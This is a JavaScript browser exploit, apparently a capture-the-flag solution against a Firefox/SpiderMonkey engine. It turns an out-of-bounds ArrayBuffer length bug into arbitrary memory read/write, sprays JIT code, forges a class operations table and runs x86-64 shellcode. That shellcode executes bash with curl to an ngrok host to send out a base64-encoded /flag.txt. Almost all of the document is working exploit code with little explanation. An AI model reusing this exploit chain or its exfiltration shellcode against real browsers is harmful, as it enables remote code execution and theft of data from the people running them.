// Bit-cast an uint64_t to a float64
converter = new ArrayBuffer(8);
u64view = new BigUint64Array(converter);
f64view = new Float64Array(converter);
function i2d(x) {
    u64view[0] = x;
    return f64view[0];
}

// Create OOB objects
objs = []
for (let _ = 0; _ < 64; _++){
    tmp = new ArrayBuffer(0x48)

    // Trigger OOB
    tmp.byteLength = 0x800000
    objs.push(tmp)
}

corruptor = new BigUint64Array(objs[0])
corruptor[0] = 0xdeadbeefcafebaben
corrupted = objs[1]
corrupted.leak = undefined

// Leak slot and libxul
slot_leak = corruptor[0x78/8]
console.log('Slot leak: 0x' + slot_leak.toString(16))

// Primitives
function arbwrite64(addr, val){
    corruptor[0x78/8] = addr
    corr_arr = new BigUint64Array(corrupted)
    corr_arr[0] = val
}
function arbwrite8(addr, val){
    corruptor[0x78/8] = addr
    corr_arr = new Uint8Array(corrupted)
    corr_arr[0] = val
}
function arbread64(addr){
    corruptor[0x78/8] = addr
    corr_arr = new BigUint64Array(corrupted)
    return corr_arr[0]
}
function arbread8(addr){
    corruptor[0x78/8] = addr
    corr_arr = new Uint8Array(corrupted)
    return corr_arr[0]
}
function addrof(obj){
    corrupted.leak = obj
    slot_arr = corruptor[0x68/8]
    return arbread64(slot_arr) & 0xffffffffffffn
}

// JIT spray https://github.com/vigneshsrao/CVE-2019-11707/blob/master/exploit.js#L196
function jitme_daddy () {
    const magic = 4.183559446463817e-216

    const g1 = 1.4501798452584495e-277
    const g2 = 1.4499730218924257e-277
    const g3 = 1.4632559875735264e-277
    const g4 = 1.4364759325952765e-277
    const g5 = 1.450128571490163e-277
    const g6 = 1.4501798485024445e-277
    const g7 = 1.4345589835166586e-277
    const g8 = 1.616527814e-314
}
for (i=0;i<100000;i++) jitme_daddy()

window.onload = function() {
    jit_addr = 0n

    // Find code page
    while(1){
        jit_addr = addrof(jitme_daddy)
        if ((jit_addr & 0xffffff000000n) == (slot_leak & 0xffffff000000n)){
            break
        }
    }
    console.log('Jit func: 0x' + jit_addr.toString(16))
    code_ptr = arbread64(jit_addr+0x28n)
    code_page = arbread64(code_ptr) & 0xfffffffffffff000n - 0x6000n
    console.log('Code page: 0x' + code_page.toString(16))

    // Find shellcode
    code = new Uint8Array(0xc000 - 8)
    for(let i = 0; i < 0xc000 - 8; i++){
        code[i] = arbread8(code_page+BigInt(i))
    }

    jit_off = -1;
    for (let i = 0; i < 0xc000 - 8; i++) {
        if (code[i] == 0x37 && code[i + 1] == 0x13 && code[i + 2] == 0x37
            && code[i + 3] == 0x13 && code[i + 4] == 0x37 && code[i + 5] == 0x13
            && code[i + 6] == 0x37 && code[i + 7] == 0x13) {
                jit_off = i + 14;
                break;
        }
    }

    jit_shellcode = code_page + BigInt(jit_off)
    console.log('Jit shellcode: 0x' + jit_shellcode.toString(16))

    // /bin/bash -c "curl http://7568-73-210-47-221.ngrok.io/\`cat /flag.txt|base64 -w0\`"
    shellcode = new Uint8Array(
        [
            0x48,0x8d,0x35,0xdd,0x00,0x00,0x00,0x48,0x8d,0x05,0xd6,0x00,0x00,0x00,0x48,0x8d,
            0x0d,0xeb,0xff,0xff,0xff,0x48,0x39,0xf0,0x73,0x18,0x66,0x0f,0x1f,0x44,0x00,0x00,
            0x48,0x8b,0x10,0x48,0x83,0xc0,0x18,0x48,0x01,0xca,0x48,0x01,0x0a,0x48,0x39,0xf0,
            0x72,0xee,0x31,0xc0,0xe9,0x07,0x00,0x00,0x00,0x0f,0x1f,0x80,0x00,0x00,0x00,0x00,
            0x48,0x8d,0x3d,0x4a,0x00,0x00,0x00,0x48,0x8d,0x05,0x4d,0x00,0x00,0x00,0x48,0xc7,
            0x44,0x24,0xf0,0x00,0x00,0x00,0x00,0x66,0x48,0x0f,0x6e,0xc8,0x66,0x48,0x0f,0x6e,
            0xc7,0x48,0x8d,0x74,0x24,0xd8,0x48,0xc7,0x44,0x24,0xd0,0x00,0x00,0x00,0x00,0x66,
            0x0f,0x6c,0xc1,0x48,0x8d,0x05,0x26,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0xd0,0x48,
            0x89,0x44,0x24,0xe8,0xb8,0x3b,0x00,0x00,0x00,0x0f,0x29,0x44,0x24,0xd8,0x0f,0x05,
            0xc3,0x2f,0x62,0x69,0x6e,0x2f,0x62,0x61,0x73,0x68,0x00,0x2d,0x63,0x00,0x66,0x90,
            0x63,0x75,0x72,0x6c,0x20,0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x66,0x32,0x39,
            0x37,0x2d,0x37,0x33,0x2d,0x32,0x31,0x30,0x2d,0x34,0x37,0x2d,0x32,0x32,0x31,0x2e,
            0x6e,0x67,0x72,0x6f,0x6b,0x2e,0x69,0x6f,0x2f,0x60,0x63,0x61,0x74,0x20,0x2f,0x66,
            0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x7c,0x62,0x61,0x73,0x65,0x36,0x34,0x20,0x2d,
            0x77,0x30,0x60,0x00
        ]
    )

    // Build fake class
    shellcode_addr = addrof(shellcode)
    for(let i = 0; i < 16384; i++){
        shellcode_addr = addrof(shellcode)
    }
    console.log('Shellcode : 0x' + shellcode_addr.toString(16))
    shellcode_shape = arbread64(shellcode_addr)
    shellcode_baseshape = arbread64(shellcode_shape)
    shellcode_class = arbread64(shellcode_baseshape)
    shellcode_ops = arbread64(shellcode_class + 0x10n)
    shellcode_data = arbread64(shellcode_addr + 0x30n)

    fake_class = new BigUint64Array(48)
    fakeclass_addr = addrof(fake_class)
    for(let i = 0; i < 16384; i++){
        fakeclass_addr = addrof(fake_class)
    }

    fake_class_buffer = arbread64(fakeclass_addr + 0x30n);
    for (let i = 0; i < 6; i++) {
        fake_class[i] = arbread64(shellcode_class + BigInt(i) * 8n)
    }

    fake_ops = new BigUint64Array(88)
    fakeops_addr = addrof(fake_ops)
    for(let i = 0; i < 16384; i++){
        fakeops_addr = addrof(fake_ops)
    }

    fake_ops_buffer = arbread64(fakeops_addr + 0x30n)
    for (let i = 0; i < 11; i++) {
        fake_ops[i] = arbread64(shellcode_ops + BigInt(i) * 8n)
    }

    fake_ops[0] = jit_shellcode
    fake_class[2] = fake_ops_buffer
    arbwrite64(shellcode_baseshape, fake_class_buffer)

    // Trigger payload
    shellcode.trigger = i2d(shellcode_data)
}